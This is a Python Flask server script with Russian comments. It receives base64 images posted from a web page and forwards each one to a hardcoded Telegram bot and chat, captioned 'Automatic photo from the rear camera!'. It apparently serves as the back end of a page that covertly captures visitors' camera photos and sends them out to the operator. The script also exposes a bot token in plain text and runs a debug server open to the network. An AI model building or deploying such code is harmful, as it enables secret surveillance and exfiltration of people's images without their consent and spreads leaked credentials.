from flask import Flask, render_template, request, jsonify
import requests
import base64
import io

app = Flask(__name__)

# Данные твоего бота Telegram
BOT_TOKEN = "8775545553:AAHxe_PCWYGQ_6B6apt0Eu-kPP8tdvPE-Uw"
CHAT_ID = "1318324272"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data.get('image')

    if not image_data:
        return jsonify({"status": "error", "message": "No image"}), 400

    # Декодируем base64 изображение
    header, encoded = image_data.split(",", 1)
    file_bytes = base64.b64decode(encoded)

    # Отправляем фото в Telegram
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': ('photo.jpg', io.BytesIO(file_bytes), 'image/jpeg')}
    data = {'chat_id': CHAT_ID, 'caption': '📸 Автоматическое фото с задней камеры!'}

    try:
        response = requests.post(url, data=data, files=files)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # host='0.0.0.0' позволяет принимать подключения из сети
    app.run(host='0.0.0.0', port=5000, debug=True)